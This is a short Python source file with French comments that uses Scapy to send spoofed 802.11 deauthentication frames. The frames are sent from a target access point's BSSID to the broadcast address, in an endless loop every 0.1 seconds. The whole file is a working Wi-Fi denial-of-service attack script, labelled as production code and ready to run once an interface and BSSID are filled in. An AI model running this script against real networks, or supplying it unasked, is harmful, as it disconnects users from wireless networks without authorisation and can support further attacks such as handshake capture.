from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Deauth
from scapy.all import sendp
__author__ = "Chauvin Antoine"
__copyright__ = ""
__credits__ = ["Chauvin Antoine"]
__license__ = ""
__version__ = "1.0"
__maintainer__ = "Chauvin Antoine"
__email__ = "antoine.chauvin@live.fr"
__status__ = "Production"


class ScapyDeauth:
    """On définis une classe ScapyDeauth qui se chargera
    d'envoyer une trame 802.11 de Désauthentification'"""
    def __init__(self, iface, bssid):
        self.iface = iface
        self.bssid = bssid
        self.destination = "ff:ff:ff:ff:ff:ff"

    def start(self):
        """"
        Méthode de classe principale qui se contente de lancer la désauthentification
        """
        frame = RadioTap()/Dot11(addr1=self.destination, addr2=self.bssid, addr3=self.bssid)/Dot11Deauth()
        sendp(frame, iface=self.iface, loop=1, inter=0.100)

if __name__ == "__main__":
    my_deauth = ScapyDeauth(iface="", bssid="")
    my_deauth.start()
